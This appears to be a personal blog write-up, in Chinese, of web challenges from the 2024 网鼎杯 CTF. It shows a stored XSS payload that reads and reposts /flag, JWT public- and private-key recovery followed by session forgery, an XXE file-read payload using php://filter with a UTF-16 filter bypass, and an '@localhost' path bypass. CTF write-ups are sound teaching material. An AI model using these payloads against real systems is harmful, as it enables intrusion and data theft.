+++
title = "网鼎杯2024青龙组"
slug = "wangding-cup-2024-qinglong-group"
description = ""
date = "2024-10-29T10:57:28"
lastmod = "2024-10-29T10:57:28"
image = ""
license = ""
categories = ["赛题"]
tags = ["xss", "jwt"]
+++

# 0x01 

感觉感觉不出来什么感觉

# 0x02 

## 签到

直接交flag

## web02

首先F12看到是`Werkzeug/3.0.3 Python/3.8.19`

![image-20241029133335119](image-20241029133335119.png)

然后就会往ssti去靠了，随便登录之后发现没啥区别，会自动生成一个哈希，然后用`payloadallthings`进行`fuzz`，进行回显查看，发现还是不行

查看源代码发现是直接插入的

```html
</div>
        </form>
        <br>
        <br>
        <h3>无人机 ToDo List</h3>
            <div>1. 早上起飞监控</div>
            <br>
            <div>2. 中午加班监控</div>
            <br>
            <div>3. 晚上回收并进行复盘</div>
            <br>2<br>
    </div>
```

```
<script>alert(1)</script>
```

成功弹窗

然后有个`/flag`路由，这里我们是将路由给写到当前页面

```html
POST /content/f2260ea5a2a5967f8e4a7e80322363c7 HTTP/1.1
Host: 0192d5e248dc7e5b87ec4d98a1a66d68.8fwa.dg09.ciihw.cn:46739
Content-Length: 273
Cache-Control: max-age=0
Origin: http://0192d5e248dc7e5b87ec4d98a1a66d68.8fwa.dg09.ciihw.cn:46739
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://0192d5e248dc7e5b87ec4d98a1a66d68.8fwa.dg09.ciihw.cn:46739/content/f2260ea5a2a5967f8e4a7e80322363c7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close

content=<script>

fetch('/flag').then(response => response.text()).then(data => {
fetch('/content/f2260ea5a2a5967f8e4a7e80322363c7',{
    method:'POST',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:"content=1"%2bdata
})
})
</script>
```

然后提交任务就可以了

![image-20241029133347803](image-20241029133347803.png)

## web01

先爆破弱密码发现进不去，随便搞个登录

发现是有两个cookie

```
token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMyJ9.DUgNOi9fTFZBluB4BndvCRSOJENSgXCrOt9_chJcDPchWQKI9CtiwXZcBUAbMS_mFaNEo9cJbelUs3PtTzrCvJ61B65n6oWOTOMF8OXbAP1JzFy8pJZ4Qxn0J8aJ-dSzSmWLbz_7G08w289n-y5P38OPKFH4_j7faOKvZ8-r8QHI

session=eyJjc3JmX3Rva2VuIjoiNmJlY2I1YmU1NDQwYzNkZjczOThkM2RjYWQwOTM3NzU3YzU1NDg5NSIsInJvbGUiOiJndWVzdCJ9.ZyCL-w.UEET88WyLd9SQuS_-4oflbTpr04
```

先爆破`jwt`看看，`jwt`是有RSA的公钥的你敢信？拿到两个账号的`jwt`

```
https://github.com/silentsignal/rsa_sign2n
```

先利用这个脚本爆破两个`jwt`的公钥

```
python3 jwt_forgery.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI
6IjMifQ.GwPSBCVSuWrCQ0KYKv3bAaC5SaklZdNDT23VfqbplgMs8wepPSdy1FA9brNOvVefGjM
rjrx-nB8w957_BvcBY1kmKbyKY8ujriLk1TEPr5shT3pYX6N2d_AA9Uk9IwgsxQpUir1fIXRZaJ
Bk-UFlP4CYrhCfbV_5b-GTux_vuzst eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2V
ybmFtZSI6IjQifQ.I_VZYx4YtiY84XdzQRVTA_WvxGfrHj-E7D-WGi810q3i_Ev4l3ZqHZK6cy1
_fkvCiV5oA-MJoO_mMidPKzQbPv512rm9g6yA-6OM31fU9-dBaHiNBKiN4y4B2f_qJ6CScYY-4x
NuSJ6QsjRI0hdwZVuFlkUbXGTeObBpZPo8cdd9
```

然后得到公钥

```
root@7b3c6c82fc07:/app# cat 24a550c7c2ce0ff2_65537_x509.pem
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgSSlUMfCzg/ysG4ixoi6NKGuWNnv
IpZZTRNa045eH2xzzY/ZyRwDojStMH5wxG6nOVvNAY/ETx2XPPC6J1J//nzC1fAN
MNCYRa47xIW0RwZBDSABcGnwu3QP2nr7AR0/tZmSClncdwA7RKzlJM8Fs7Zmb502
ZMSv0AxMgN5UMh9FCwIDAQAB
-----END PUBLIC KEY-----
```

再用工具爆破私钥

```
https://github.com/RsaCtfTool/RsaCtfTool

python3 RsaCtfTool.py --publickey ./key.pub --private
```

```
-----BEGIN RSA PRIVATE KEY-----
MIICoQIBAAKBgSSlUMfCzg/ysG4ixoi6NKGuWNnvIpZZTRNa045eH2xzzY/ZyRwD
ojStMH5wxG6nOVvNAY/ETx2XPPC6J1J//nzC1fANMNCYRa47xIW0RwZBDSABcGnw
u3QP2nr7AR0/tZmSClncdwA7RKzlJM8Fs7Zmb502ZMSv0AxMgN5UMh9FCwIDAQAB
AoGBC5/r+nCv2+uWXTjL8i6UJtLIfdOssxKbJNiIKLXQh3l8IAAfx1i9ktxYEICW
TcGTUkx9gjd+xUwo0KOKjcg3hZc7bEfLkiOsK8dSwsPFEXYQpCE1EFokhkc9Rbiq
URC9QIrQjtzf5vdU2usj5ddRGtqtmpXm/ibU1TLPIsy8Y5TJAoGBAP2Mj8b+pnwu
SCp0EYh99ogr6jblQlVwySv34UDQarcFjkQoB60SOMZpGCyPr/auhfDIsNvKyXLK
S7IBEBFMETWywUx28OGFV7xtGF7RfLWmaKYXy4ML/DfHonV8khZ6h5wpyxPL3Wli
uJCSSsjNgXhj4aeGLtRRuySpiXflrdFvAgElAoGBALrhzOO+tJWZQ2XPMVEqjvjl
bXfS2WbCf/Theuzb8Zw/AxJncuj1IlXUBpZpvigTkPPd6MXIHV13j/1+3QnyyEiN
Hf6vOHLxZq6itrDEtafqJP4vUbigr+GpSqxQChl5bNUE1QMdY3AW7LTarzZ8iq5i
6GMi+wdRyp+GOqXd65UPAgERAoGAUjts5pfHSt6T8hfOVcf87eS6qgUqRTlWAGwR
tCfrQkb9tT1qRfgSadzlPuJ+QirDqAm80amNcVZdvTDG8NpmckfP/R+oEcphpOUc
qSFY4PezPMlyb7DcLcQ0sHttpmztthtkdR+GFFdedBPFOjTQC16qDNGSpbmkepfZ
jqta99E=
-----END RSA PRIVATE KEY-----
```

![1](QQ20241030-111649.png)

当然了 脚本厨子什么的也可以，我觉得这个网站是挺好用的

```
https://www.bejson.com/jwt/
```

然后进去玩`game`，表情包执行命令

![1](QQ20241030-111810.png)

`flag`，是一个文件夹

```
💿 🚩😜😐🐱 ⭐
```

读到`key`

```
36f8efbea152e50b23290e0ed707b4b0
```

然后伪造session，到了这里终于是快结束了，每一步都很艰难，发现可以上传文件这里上传一个`xml`，来打`xxe`

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe[
<!ELMENT name ANY>
<!ENTITY xxe SYSTEM"php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php">]>
<root>
    <name>
        &xxe;
    </name>
</root>
```

然后这里还是被过滤了的，需要`utf-16`编码绕过一下

```
cat 1.xml | iconv -f utf-8 -t utf-16be > payload.8-16be.xml
```

上传之后走路径访问攻击的时候需要绕过一下本地

```
path=www.testctf.com@localhost/&user_input=/var/www/html/uploads/ad3e78b142e723460655
d9a2154b7d95
```

![1](QQ20241030-112522.png)

# 0x03 小结

打通的题目肯定不止这些，但是我一个web手，其他的也不想写，最好笑的是最后打不动了，眼睁睁看着自己从97->165，大家都顿悟上了

web1的话我并没有打通甚至算jwt都没有过，不过赛后很感谢朋友们给的wp嘻嘻

想要我其他wp的，可以加我好友发你！
